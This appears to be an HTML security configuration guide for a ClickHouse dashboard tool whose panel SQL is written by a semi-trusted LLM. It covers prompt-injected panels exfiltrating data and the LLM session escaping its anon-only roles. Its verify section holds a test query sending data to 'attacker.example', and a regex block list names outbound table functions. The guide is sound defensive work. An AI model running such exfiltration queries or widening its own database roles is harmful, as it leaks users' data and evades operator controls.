@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>bentoclick — Security Configuration Guide</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    font-size: 15px;
+    line-height: 1.65;
+    color: #1a1a2e;
+    background: #f7f8fc;
+    padding: 2rem 1rem;
+  }
+
+  .page {
+    max-width: 860px;
+    margin: 0 auto;
+    background: #ffffff;
+    border: 1px solid #dde1f0;
+    border-radius: 8px;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+    padding: 2.5rem 3rem;
+  }
+
+  h1 {
+    font-size: 1.75rem;
+    font-weight: 700;
+    color: #0d0d1a;
+    margin-bottom: 0.35rem;
+  }
+
+  .subtitle {
+    font-size: 0.95rem;
+    color: #555577;
+    margin-bottom: 2rem;
+  }
+
+  h2 {
+    font-size: 1.2rem;
+    font-weight: 700;
+    color: #0d0d1a;
+    margin: 2.5rem 0 0.75rem;
+    padding-bottom: 0.4rem;
+    border-bottom: 2px solid #e8eaf6;
+  }
+
+  h3 {
+    font-size: 1rem;
+    font-weight: 700;
+    color: #1a1a2e;
+    margin: 1.5rem 0 0.5rem;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    font-size: 0.82rem;
+  }
+
+  p { margin-bottom: 0.9rem; }
+
+  .intro-box {
+    background: #f0f2ff;
+    border-left: 4px solid #4b5ec7;
+    border-radius: 0 6px 6px 0;
+    padding: 1rem 1.25rem;
+    margin-bottom: 2rem;
+    font-size: 0.95rem;
+    color: #1a1a3e;
+  }
+
+  .intro-box strong { color: #2d3abf; }
+
+  /* Risk badge */
+  .risk-header {
+    display: flex;
+    align-items: center;
+    gap: 0.75rem;
+    margin-bottom: 1rem;
+  }
+
+  .risk-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.4rem;
+    padding: 0.28rem 0.75rem;
+    border-radius: 999px;
+    font-size: 0.78rem;
+    font-weight: 700;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    white-space: nowrap;
+  }
+
+  .risk-badge.high {
+    background: #fff0f0;
+    color: #c0392b;
+    border: 1px solid #f5c6c6;
+  }
+
+  .risk-badge.medium {
+    background: #fff8e6;
+    color: #a0600a;
+    border: 1px solid #f5dea0;
+  }
+
+  .status-line {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.4rem;
+    background: #f0f5ff;
+    border: 1px solid #c5d0f0;
+    border-radius: 4px;
+    padding: 0.25rem 0.65rem;
+    font-size: 0.82rem;
+    color: #2d3abf;
+    margin-bottom: 1.2rem;
+    font-weight: 600;
+  }
+
+  .status-line.live {
+    background: #f0fff4;
+    border-color: #a8dfb8;
+    color: #1a7a40;
+  }
+
+  .status-line.config-required {
+    background: #fff8e6;
+    border-color: #f5dea0;
+    color: #a0600a;
+  }
+
+  .status-dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    display: inline-block;
+  }
+
+  .dot-green { background: #27ae60; }
+  .dot-amber { background: #e08e0b; }
+
+  /* Section card */
+  .risk-section {
+    border: 1px solid #dde1f0;
+    border-radius: 8px;
+    padding: 1.75rem 2rem;
+    margin-bottom: 2.5rem;
+    background: #fff;
+  }
+
+  .risk-section .section-title {
+    font-size: 1.15rem;
+    font-weight: 700;
+    color: #0d0d1a;
+  }
+
+  /* Code blocks */
+  pre {
+    background: #1a1b2e;
+    color: #e0e4f8;
+    border-radius: 6px;
+    padding: 1.1rem 1.25rem;
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    font-size: 0.83rem;
+    line-height: 1.6;
+    overflow-x: auto;
+    margin: 0.75rem 0 1rem;
+    border: 1px solid #2a2c44;
+  }
+
+  pre .comment { color: #7c83b5; font-style: italic; }
+  pre .keyword { color: #82aaff; }
+  pre .string  { color: #c3e88d; }
+  pre .type    { color: #ffcb6b; }
+  pre .number  { color: #f78c6c; }
+  pre .special { color: #89ddff; }
+
+  code {
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    font-size: 0.85em;
+    background: #eef0fa;
+    border: 1px solid #d0d4ec;
+    border-radius: 3px;
+    padding: 0.1em 0.35em;
+    color: #2d3abf;
+  }
+
+  pre code {
+    background: none;
+    border: none;
+    padding: 0;
+    color: inherit;
+    font-size: inherit;
+  }
+
+  .caption {
+    font-size: 0.78rem;
+    color: #7a7ea8;
+    margin-top: -0.6rem;
+    margin-bottom: 1rem;
+    font-style: italic;
+  }
+
+  /* Warning callout */
+  .callout {
+    border-radius: 6px;
+    padding: 0.85rem 1.1rem;
+    margin: 0.9rem 0;
+    font-size: 0.9rem;
+  }
+
+  .callout.warn {
+    background: #fff8e6;
+    border-left: 3px solid #e08e0b;
+    color: #5a3800;
+  }
+
+  .callout.info {
+    background: #f0f5ff;
+    border-left: 3px solid #4b5ec7;
+    color: #1a1a4e;
+  }
+
+  .callout.success {
+    background: #f0fff4;
+    border-left: 3px solid #27ae60;
+    color: #0a3d1f;
+  }
+
+  /* Checklist table */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.88rem;
+    margin-top: 1rem;
+  }
+
+  th {
+    background: #1a1b2e;
+    color: #c5cbf0;
+    padding: 0.6rem 0.85rem;
+    text-align: left;
+    font-weight: 600;
+    font-size: 0.8rem;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+  }
+
+  th:first-child { border-radius: 6px 0 0 0; }
+  th:last-child  { border-radius: 0 6px 0 0; }
+
+  td {
+    padding: 0.6rem 0.85rem;
+    border-bottom: 1px solid #e8eaf6;
+    vertical-align: top;
+  }
+
+  tr:last-child td { border-bottom: none; }
+  tr:nth-child(even) td { background: #f7f8fc; }
+
+  td .check-ok   { color: #27ae60; font-weight: 700; }
+  td .check-warn { color: #e08e0b; font-weight: 700; }
+
+  .pill {
+    display: inline-block;
+    padding: 0.1rem 0.5rem;
+    border-radius: 999px;
+    font-size: 0.75rem;
+    font-weight: 700;
+  }
+  .pill-red    { background: #fff0f0; color: #c0392b; border: 1px solid #f5c6c6; }
+  .pill-amber  { background: #fff8e6; color: #a0600a; border: 1px solid #f5dea0; }
+  .pill-green  { background: #f0fff4; color: #1a7a40; border: 1px solid #a8dfb8; }
+  .pill-blue   { background: #f0f5ff; color: #2d3abf; border: 1px solid #c5d0f0; }
+
+  hr {
+    border: none;
+    border-top: 1px solid #e8eaf6;
+    margin: 2rem 0;
+  }
+
+  footer {
+    font-size: 0.8rem;
+    color: #999bb8;
+    text-align: center;
+    margin-top: 2.5rem;
+    padding-top: 1.25rem;
+    border-top: 1px solid #e8eaf6;
+  }
+
+  ul, ol {
+    padding-left: 1.5rem;
+    margin-bottom: 0.9rem;
+  }
+  li { margin-bottom: 0.3rem; }
+
+  .arch-diagram {
+    background: #f7f8fc;
+    border: 1px solid #dde1f0;
+    border-radius: 6px;
+    padding: 1rem 1.25rem;
+    font-family: "SFMono-Regular", Consolas, monospace;
+    font-size: 0.8rem;
+    color: #2a2c44;
+    margin: 0.9rem 0 1rem;
+    line-height: 1.8;
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <!-- ================================================================ HEADER -->
+  <h1>bentoclick — Security Configuration Guide</h1>
+  <p class="subtitle">Deployment risks P5 and P6 — operator action required before exposing to untrusted LLMs or external users</p>
+
+  <div class="intro-box">
+    <strong>Important context: tokenized masked sandboxing is not full anonymization.</strong>
+    bentoclick's LLM-authoring flow operates against a masked sandbox database
+    (<code>&lt;db&gt;_anon</code>, e.g. <code>claude_otel_anon</code>) where real identifiers are replaced
+    with stable tokens. A de-tokenization step at view time rewrites panel SQL back to real tables
+    and swaps tokens for real values — but only for human viewers. This architecture meaningfully
+    limits what an LLM can see during authoring, <strong>but it does not eliminate all
+    attack surface</strong>. The two risks documented below are not code bugs; they are
+    <strong>deployment configuration responsibilities</strong> that each operator must satisfy
+    before exposing bentoclick to semi-trusted LLMs or sharing dashboards with users.
+  </div>
+
+  <!-- ================================================================ ARCHITECTURE SUMMARY -->
+  <h2>Architecture summary</h2>
+  <p>Understanding the two risk surfaces requires a mental model of the two identities in play:</p>
+
+  <div class="arch-diagram">LLM authoring channel<br>
+  &nbsp;&nbsp; CH identity: <strong>human email</strong> — narrowed by MCP role_filter to anon roles<br>
+  &nbsp;&nbsp; Reads: <code>&lt;db&gt;_anon</code> views, <code>bentoclick.schema_guide</code>, <code>attr_guide</code><br>
+  &nbsp;&nbsp; Writes: <code>bentoclick.dashboards_raw</code> (via <code>anon_author_role</code>)<br>
+<br>
+Saved dashboard panel = <strong>SQL string</strong> (authored by LLM)<br>
+  &nbsp;&nbsp; Stored in <code>bentoclick.dashboards_tok</code> / <code>dashboards_raw</code><br>
+  &nbsp;&nbsp; De-tok MV rewrites <code>&lt;db&gt;_anon</code> → <code>&lt;db&gt;</code> + detokenizes via <code>bentosecrets.*</code><br>
+  &nbsp;&nbsp; Final read target: <code>bentoclick.dashboards</code><br>
+<br>
+Human viewer channel<br>
+  &nbsp;&nbsp; SPA fetches panel SQL from <code>bentoclick.dashboards</code><br>
+  &nbsp;&nbsp; Executes panel SQL <strong>AS the viewer's own CH identity</strong><br>
+  &nbsp;&nbsp; <span style="color:#c0392b">◀ P5 risk surface: panel SQL runs with viewer privileges</span><br>
+<br>
+LLM session identity<br>
+  &nbsp;&nbsp; Today: human JWT, role_filter → anon roles only; execute_query is read-only<br>
+  &nbsp;&nbsp; <span style="color:#a0600a">◀ P6 risk surface: isolation depends on filter staying correct</span>
+  </div>
+
+  <!-- ================================================================ P5 -->
+  <div class="risk-section">
+    <div class="risk-header">
+      <span class="risk-badge high">P5 — High</span>
+      <span class="section-title">Panel SQL runs with the viewer's privileges — no SQL allowlist</span>
+    </div>
+
+    <div class="status-line config-required">
+      <span class="status-dot dot-amber"></span>
+      Status: requires configuration — viewer role grants are operator-defined; defaults may be too broad
+    </div>
+
+    <h3>Risk</h3>
+    <p>
+      A dashboard panel is stored as a raw SQL string authored by a semi-trusted LLM. At view
+      time the SPA sends that SQL to ClickHouse <strong>as the human viewer's own identity</strong>.
+      bentoclick sanitizes panel <em>HTML output</em> via <code>sanitize_json_text</code>, but it
+      does not parse or allowlist the SQL itself. A malicious or prompt-injected panel can
+      therefore do anything the viewer's ClickHouse user is permitted to do.
+    </p>
+
+    <h3>Why it matters</h3>
+    <ul>
+      <li><strong>Exfiltration via table functions:</strong> <code>url()</code>, <code>s3()</code>,
+        <code>remote()</code>, <code>file()</code>, <code>mysql()</code>, <code>postgresql()</code> and
+        similar can tunnel data to an attacker-controlled endpoint if <code>SOURCES</code> privileges
+        are granted to the viewer role.</li>
+      <li><strong>Horizontal data access:</strong> if the viewer's grants include tables beyond what
+        any dashboard should ever touch, a crafted panel silently reads them.</li>
+      <li><strong>Resource exhaustion (DoS):</strong> without query-level caps, a panel can issue a
+        full table scan that saturates the cluster.</li>
+      <li><strong>DDL / data mutation:</strong> if the viewer somehow holds DDL or INSERT grants,
+        a panel could alter or destroy tables.</li>
+    </ul>
+
+    <div class="callout warn">
+      The severity depends entirely on what <code>bentoclick_viewer_role</code> is granted. A viewer
+      role with <code>GRANT SELECT ON *.*</code> and no SOURCES revoke is a full read exfiltration
+      channel. A viewer role with narrow per-database grants and a hard readonly profile is safe.
+    </div>
+
+    <h3>Proper configuration</h3>
+
+    <p><strong>Step 1 — Attach a read-only settings profile with resource caps.</strong></p>
+    <pre><code><span class="comment">-- Create a profile that enforces read-only mode and sane query limits.</span>
+<span class="comment">-- readonly=1 means: no INSERT/DDL/SET (except SET ROLE/SET SETTING guarded by</span>
+<span class="comment">-- the profile itself). allow_ddl=0 is belt-and-suspenders.</span>
+<span class="comment">-- Adjust the numeric caps for your cluster size.</span>
+
+<span class="keyword">CREATE</span> SETTINGS PROFILE IF NOT EXISTS viewer_safe_profile
+    SETTINGS
+        readonly                    = 1,
+        allow_ddl                   = 0,
+        <span class="comment">-- Time / row / byte guards</span>
+        max_execution_time          = 30,      <span class="comment">-- seconds</span>
+        max_rows_to_read            = 100000000,
+        max_bytes_to_read           = 5368709120,  <span class="comment">-- 5 GiB</span>
+        max_memory_usage            = 2147483648,  <span class="comment">-- 2 GiB</span>
+        <span class="comment">-- Result-set guards (stop a panel from pulling down huge data)</span>
+        max_result_rows             = 10000,
+        max_result_bytes            = 52428800  <span class="comment">-- 50 MiB</span>
+    READONLY 1;  <span class="comment">-- prevent a session from overriding these settings</span>
+
+<span class="keyword">ALTER</span> ROLE bentoclick_viewer_role
+    SETTINGS PROFILE viewer_safe_profile;</code></pre>
+    <p class="caption">All constraints carry READONLY 1 so a panel cannot do <code>SET max_execution_time = 999999</code> to escape them.</p>
+
+    <p><strong>Step 2 — Revoke SOURCES to eliminate table-function exfiltration.</strong></p>
+    <pre><code><span class="comment">-- SOURCES is the umbrella privilege controlling all table functions that</span>
+<span class="comment">-- open outbound connections. Revoking it at *.* removes the exfiltration</span>
+<span class="comment">-- channel entirely, regardless of individual table-function availability.</span>
+
+<span class="keyword">REVOKE</span> SOURCES <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;
+
+<span class="comment">-- Belt-and-suspenders: revoke the individual function-level privileges too.</span>
+<span class="comment">-- Relevant on older CH versions where SOURCES may not be a single umbrella.</span>
+<span class="keyword">REVOKE</span> FILE    <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;
+<span class="keyword">REVOKE</span> URL     <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;
+<span class="keyword">REVOKE</span> REMOTE  <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;
+<span class="keyword">REVOKE</span> S3      <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;
+<span class="keyword">REVOKE</span> HDFS    <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;
+<span class="keyword">REVOKE</span> MYSQL   <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;
+<span class="keyword">REVOKE</span> POSTGRES <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;
+<span class="keyword">REVOKE</span> MONGO   <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;
+<span class="keyword">REVOKE</span> REDIS   <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;
+<span class="keyword">REVOKE</span> SQLITE  <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;
+<span class="keyword">REVOKE</span> ODBC    <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;
+<span class="keyword">REVOKE</span> JDBC    <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;</code></pre>
+
+    <p><strong>Step 3 — Narrow SELECT grants to exactly the databases dashboards need.</strong></p>
+    <pre><code><span class="comment">-- NEVER grant SELECT ON *.* to the viewer role.</span>
+<span class="comment">-- Enumerate only the real databases that dashboards query.</span>
+<span class="comment">-- Replace claude_otel with your actual database names.</span>
+
+<span class="keyword">GRANT</span> SELECT <span class="keyword">ON</span> claude_otel.* <span class="keyword">TO</span> bentoclick_viewer_role;
+<span class="keyword">GRANT</span> SELECT <span class="keyword">ON</span> system.metrics,
+              system.asynchronous_metrics,
+              system.events,
+              system.processes,
+              system.query_log
+           <span class="keyword">TO</span> bentoclick_viewer_role;
+<span class="comment">-- system views that expose replicas/parts/merges are fine if needed.</span>
+<span class="comment">-- Do NOT grant system.users, system.roles, system.grants, etc.</span>
+
+<span class="comment">-- Explicitly ensure no DDL, no INSERT, no dictGet on real secrets.</span>
+<span class="keyword">REVOKE</span> INSERT <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;
+<span class="keyword">REVOKE</span> dictGet <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> bentoclick_viewer_role;
+<span class="keyword">REVOKE</span> SELECT <span class="keyword">ON</span> bentosecrets.* <span class="keyword">FROM</span> bentoclick_viewer_role;</code></pre>
+
+    <p><strong>Step 4 (optional, secondary) — Save-time regex guard in the dashboards MV.</strong></p>
+    <p>
+      The RBAC/profile approach above is unbypassable at the ClickHouse level. As an additional
+      defence-in-depth measure, the materialized view that writes to <code>dashboards_raw</code> can
+      reject obviously hostile SQL at save time, before it ever reaches a viewer.
+    </p>
+    <pre><code><span class="comment">-- Add a check inside sanitize_panel (schema/01-database.sql) or as a</span>
+<span class="comment">-- separate column constraint on dashboards_raw.</span>
+<span class="comment">-- This is a secondary guard — do not rely on it as the only barrier.</span>
+
+<span class="keyword">ALTER</span> TABLE bentoclick.dashboards_raw
+    <span class="keyword">ADD</span> CONSTRAINT chk_panel_sql_safe
+    CHECK (
+        NOT (
+            <span class="comment">-- block table functions by name (case-insensitive match)</span>
+            lower(panel_sql) REGEXP '\\b(url|s3|file|remote|mysql|postgresql|mongodb|redis|sqlite|odbc|jdbc|hdfs)\\s*\\('
+            OR
+            <span class="comment">-- block mutation/DDL keywords</span>
+            lower(panel_sql) REGEXP '\\b(insert|alter|create|drop|truncate|rename|detach|attach|system|grant|revoke)\\b'
+            OR
+            <span class="comment">-- block dictionary access (de-tok secrets are in bentosecrets dicts)</span>
+            lower(panel_sql) REGEXP '\\bdictget\\b'
+            OR
+            <span class="comment">-- block statement separators (multi-statement injection)</span>
+            panel_sql REGEXP ';\\s*[^\\s]'
+        )
+    );</code></pre>
+    <p class="caption">This regex is illustrative; tune it for your ClickHouse version's REGEXP syntax. The profile + REVOKE approach (steps 1–3) is the authoritative barrier.</p>
+
+    <h3>Verify</h3>
+    <p>After applying the above, run these checks as a user who holds <code>bentoclick_viewer_role</code>:</p>
+    <pre><code><span class="comment">-- 1. Table-function exfiltration must be denied.</span>
+<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> url(<span class="string">'https://attacker.example/exfil'</span>, CSV, <span class="string">'x String'</span>);
+<span class="comment">-- Expected: DB::Exception: ... not enough privileges ... (ACCESS_DENIED)</span>
+
+<span class="comment">-- 2. Readonly profile must reject settings override.</span>
+<span class="keyword">SET</span> max_execution_time = 9999;
+<span class="comment">-- Expected: DB::Exception: ... setting is readonly ... (SETTING_CONSTRAINT_VIOLATION)</span>
+
+<span class="comment">-- 3. DDL must be denied.</span>
+<span class="keyword">CREATE</span> TABLE bentoclick.pwn (x UInt8) <span class="keyword">ENGINE</span> = Memory;
+<span class="comment">-- Expected: DB::Exception: ... not enough privileges ... (ACCESS_DENIED)</span>
+
+<span class="comment">-- 4. bentosecrets must be unreadable.</span>
+<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> bentosecrets.token_to_real <span class="keyword">LIMIT</span> 1;
+<span class="comment">-- Expected: DB::Exception: ... not enough privileges ... (ACCESS_DENIED)</span>
+
+<span class="comment">-- 5. Normal dashboard query must succeed.</span>
+<span class="keyword">SELECT</span> count() <span class="keyword">FROM</span> claude_otel.otel_traces <span class="keyword">LIMIT</span> 1;
+<span class="comment">-- Expected: returns a number.</span></code></pre>
+  </div>
+
+  <!-- ================================================================ P6 -->
+  <div class="risk-section">
+    <div class="risk-header">
+      <span class="risk-badge medium">P6 — Medium</span>
+      <span class="section-title">LLM channel runs as the human identity narrowed by role_filter (SET ROLE fragility)</span>
+    </div>
+
+    <div class="status-line live">
+      <span class="status-dot dot-green"></span>
+      Current live posture: blocked — anon roles only are active; execute_query is read-only so SET ROLE is rejected.
+      This configuration hardens against future misconfig.
+    </div>
+
+    <h3>Risk</h3>
+    <p>
+      In the current deployment, the MCP server authenticates the LLM authoring channel using
+      the <strong>human user's JWT</strong> and narrows it to <code>^anon_</code> roles via a
+      <code>role_filter</code>. This means the ClickHouse session runs as the human's email address
+      with only <code>anon_mcp_reader</code> and <code>anon_author_role</code> active.
+    </p>
+    <p>
+      The concern: if that same email address also holds real-data grants (e.g. a direct
+      <code>SELECT ON claude_otel.*</code> for their own BI use), those grants exist on the user
+      object even though they are not currently active in the LLM session. Isolation therefore
+      depends on:
+    </p>
+    <ul>
+      <li>The <code>role_filter</code> in the MCP config remaining correctly set to <code>^anon_</code>.</li>
+      <li>The <code>execute_query</code> tool remaining read-only.</li>
+      <li>No path existing to call <code>SET ROLE</code> through the MCP tooling.</li>
+    </ul>
+
+    <div class="callout info">
+      <strong>Current live posture (bentoclick on Altinity Cloud today):</strong> the MCP session
+      enables only anon roles; real-data roles are inactive; <code>execute_query</code> is
+      read-only, so a <code>SET ROLE</code> attempt is rejected at the ClickHouse level. The
+      exploit is blocked in the current configuration. The hardening below is the correct
+      <em>product posture</em> — it eliminates the dependency on those three conditions staying
+      correct simultaneously.
+    </div>
+
+    <h3>Why it matters</h3>
+    <ul>
+      <li>Any future change to the MCP config that loosens <code>role_filter</code> or
+        permits write-mode queries immediately widens the LLM's access to everything the
+        human can see.</li>
+      <li>A dedicated service principal makes the isolation <em>structural</em> rather than
+        <em>policy-dependent</em>: there are simply no real-data roles to activate, regardless
+        of filter correctness.</li>
+      <li>It also eliminates the need for operators to audit "what does this email hold?" every
+        time a user's direct grants change.</li>
+    </ul>
+
+    <h3>Proper configuration — dedicated LLM service principal</h3>
+
+    <p><strong>Step 1 — Create the service principal with only anon roles and no other grants.</strong></p>
+    <pre><code><span class="comment">-- Create a dedicated ClickHouse user for the LLM authoring channel.</span>
+<span class="comment">-- This user MUST NOT hold any real-data roles or bentosecrets access.</span>
+
+<span class="keyword">CREATE</span> USER IF NOT EXISTS bentoclick_llm
+    IDENTIFIED WITH sha256_password BY <span class="string">'&lt;strong-random-password&gt;'</span>
+    DEFAULT ROLE anon_mcp_reader, anon_author_role
+    SETTINGS PROFILE <span class="string">'default'</span>;
+
+<span class="comment">-- Grant ONLY the two anon roles — nothing else.</span>
+<span class="keyword">GRANT</span> anon_mcp_reader  <span class="keyword">TO</span> bentoclick_llm;
+<span class="keyword">GRANT</span> anon_author_role <span class="keyword">TO</span> bentoclick_llm;
+
+<span class="comment">-- Explicitly ensure no real-data access (belt-and-suspenders).</span>
+<span class="comment">-- These should be no-ops if the user was freshly created, but are</span>
+<span class="comment">-- worth stating explicitly for auditability.</span>
+<span class="keyword">REVOKE</span> ALL <span class="keyword">ON</span> claude_otel.* <span class="keyword">FROM</span> bentoclick_llm;
+<span class="keyword">REVOKE</span> ALL <span class="keyword">ON</span> bentosecrets.* <span class="keyword">FROM</span> bentoclick_llm;
+<span class="keyword">REVOKE</span> ALL <span class="keyword">ON</span> bentoclick.dashboards <span class="keyword">FROM</span> bentoclick_llm;
+<span class="comment">-- bentoclick_llm writes via anon_author_role → dashboards_raw only.</span>
+
+<span class="comment">-- Verify: the user must have no path to real data or secrets.</span>
+<span class="keyword">SELECT</span> role_name
+<span class="keyword">FROM</span>   system.role_grants
+<span class="keyword">WHERE</span>  user_name = <span class="string">'bentoclick_llm'</span>;
+<span class="comment">-- Must return: anon_mcp_reader, anon_author_role — and nothing else.</span></code></pre>
+
+    <p><strong>Step 2 — Configure the MCP server to authenticate as the service principal.</strong></p>
+    <p>
+      The MCP gating mode supports cluster-secret impersonation. Point the LLM channel at
+      <code>bentoclick_llm</code> directly instead of forwarding the human JWT. The
+      <code>role_filter</code> becomes redundant (but harmless to keep as defence-in-depth).
+    </p>
+    <pre><code><span class="comment"># mcp-values.yaml (conceptual — adjust key names for your MCP chart version)</span>
+<span class="comment"># This configures the altinity-mcp server for the LLM authoring channel.</span>
+
+altinityMcp:
+  mode: gating                     <span class="comment"># gating mode: MCP validates then impersonates</span>
+
+  clickhouse:
+    <span class="comment"># Fixed service-principal credentials for the LLM channel.</span>
+    <span class="comment"># Auth.Username overrides the inbound JWT identity.</span>
+    auth:
+      username: bentoclick_llm
+      passwordSecret:
+        name: bentoclick-llm-credentials
+        key: clickhouse-password
+
+    <span class="comment"># Narrow the tool surface: read-only execute_query + schema inspection only.</span>
+    tools:
+      execute_query:
+        readonly: true
+      allowed:
+        - execute_query
+        - describe_schema
+        - describe_attributes
+        - get_dashboards_prefix
+        - save_dashboard
+
+  <span class="comment"># role_filter is redundant with a dedicated principal but kept for clarity.</span>
+  roleFilter: "^anon_"
+
+  <span class="comment"># The human email is passed as a metadata claim for dashboard ownership</span>
+  <span class="comment"># (see Step 3 below) but is NOT used as the CH identity.</span>
+  ownerClaim: email</code></pre>
+    <p class="caption">Exact field names depend on your altinity-mcp chart version. The key invariant: <code>Auth.Username</code> must be the service principal, not the inbound JWT subject.</p>
+
+    <p><strong>Step 3 — Resolve the owner-stamping tension.</strong></p>
+    <p>
+      bentoclick routes dashboards at <code>/b/&lt;owner&gt;/&lt;slug&gt;</code> where <code>owner</code>
+      is stamped at save time via <code>currentUser()</code>. With a service principal, all
+      dashboards would be owned by <code>bentoclick_llm</code>, breaking routing.
+    </p>
+    <p>
+      The correct fix is to pass the human's email explicitly to <code>save_dashboard</code>
+      and have the <code>dashboards_mv</code> stamp <code>owner</code> from that column instead
+      of <code>currentUser()</code>:
+    </p>
+    <pre><code><span class="comment">-- In the save_dashboard MCP tool, pass the human email as a parameter.</span>
+<span class="comment">-- The MCP server extracts it from the verified JWT claim before impersonating.</span>
+
+<span class="comment">-- In dashboards_raw, add an owner_override column:</span>
+<span class="keyword">ALTER</span> TABLE bentoclick.dashboards_raw
+    <span class="keyword">ADD</span> COLUMN IF NOT EXISTS owner_override String DEFAULT <span class="string">''</span>;
+
+<span class="comment">-- In the materialized view (dashboards_mv), use owner_override when non-empty:</span>
+<span class="keyword">CREATE</span> MATERIALIZED VIEW bentoclick.dashboards_mv
+    <span class="keyword">TO</span> bentoclick.dashboards
+    DEFINER = bentoclick_definer
+    SQL SECURITY DEFINER
+    <span class="keyword">AS</span>
+    <span class="keyword">SELECT</span>
+        <span class="comment">/* other columns ... */</span>
+        if(owner_override != <span class="string">''</span>, owner_override, currentUser()) <span class="keyword">AS</span> owner,
+        <span class="comment">/* panels, title, slug ... */</span>
+    <span class="keyword">FROM</span> bentoclick.dashboards_raw;
+
+<span class="comment">-- NOTE: owner_override must only be settable via the gated MCP path,</span>
+<span class="comment">-- not by arbitrary callers. The anon_author_role INSERT on dashboards_raw</span>
+<span class="comment">-- should be audited to ensure external callers cannot forge the owner.</span></code></pre>
+
+    <div class="callout warn">
+      <strong>Audit note:</strong> if <code>owner_override</code> can be freely set by anyone with
+      INSERT on <code>dashboards_raw</code>, it introduces a dashboard-ownership spoofing vector.
+      The MCP server must be the only path that populates this column, and it must validate the
+      email against the verified JWT before passing it through.
+    </div>
+
+    <h3>Verify</h3>
+    <pre><code><span class="comment">-- 1. The service principal must have no real-data roles.</span>
+<span class="keyword">SELECT</span> role_name
+<span class="keyword">FROM</span>   system.role_grants
+<span class="keyword">WHERE</span>  user_name = <span class="string">'bentoclick_llm'</span>;
+<span class="comment">-- Must return exactly: anon_mcp_reader, anon_author_role</span>
+
+<span class="comment">-- 2. Real data must be unreachable as bentoclick_llm.</span>
+<span class="comment">-- (Run from a CH client authenticated as bentoclick_llm)</span>
+<span class="keyword">SELECT</span> count() <span class="keyword">FROM</span> claude_otel.otel_traces;
+<span class="comment">-- Expected: ACCESS_DENIED</span>
+
+<span class="comment">-- 3. SET ROLE must fail (no real roles to activate).</span>
+<span class="keyword">SET</span> ROLE ALL;
+<span class="keyword">SELECT</span> currentRoles();
+<span class="comment">-- Must return only {anon_mcp_reader, anon_author_role}.</span>
+
+<span class="comment">-- 4. Anon sandbox must be readable (basic smoke test).</span>
+<span class="keyword">SELECT</span> count() <span class="keyword">FROM</span> claude_otel_anon.otel_traces_anon <span class="keyword">LIMIT</span> 1;
+<span class="comment">-- Expected: returns a number.</span>
+
+<span class="comment">-- 5. bentosecrets must be unreadable.</span>
+<span class="keyword">SELECT</span> count() <span class="keyword">FROM</span> bentosecrets.identifier_map;
+<span class="comment">-- Expected: ACCESS_DENIED</span></code></pre>
+  </div>
+
+  <!-- ================================================================ CHECKLIST -->
+  <h2>Deployment checklist</h2>
+  <p>Complete all items before exposing the system to untrusted LLMs or external viewers.</p>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Risk</th>
+        <th>Control</th>
+        <th>Mechanism</th>
+        <th>Status</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><span class="pill pill-red">P5</span></td>
+        <td>Viewer role has <code>readonly=1</code> + resource cap profile</td>
+        <td>SETTINGS PROFILE, READONLY 1</td>
+        <td><span class="check-warn">&#9744; Operator action</span></td>
+      </tr>
+      <tr>
+        <td><span class="pill pill-red">P5</span></td>
+        <td>SOURCES revoked from viewer role</td>
+        <td>REVOKE SOURCES ON *.*</td>
+        <td><span class="check-warn">&#9744; Operator action</span></td>
+      </tr>
+      <tr>
+        <td><span class="pill pill-red">P5</span></td>
+        <td>Viewer SELECT narrowed to named databases only</td>
+        <td>GRANT SELECT ON &lt;db&gt;.* (no *.*)</td>
+        <td><span class="check-warn">&#9744; Operator action</span></td>
+      </tr>
+      <tr>
+        <td><span class="pill pill-red">P5</span></td>
+        <td>bentosecrets unreachable by viewer</td>
+        <td>REVOKE SELECT ON bentosecrets.*</td>
+        <td><span class="check-warn">&#9744; Operator action</span></td>
+      </tr>
+      <tr>
+        <td><span class="pill pill-red">P5</span></td>
+        <td>Save-time SQL regex guard (secondary)</td>
+        <td>CHECK constraint on dashboards_raw</td>
+        <td><span class="check-warn">&#9744; Optional / recommended</span></td>
+      </tr>
+      <tr>
+        <td><span class="pill pill-amber">P6</span></td>
+        <td>LLM channel uses dedicated service principal</td>
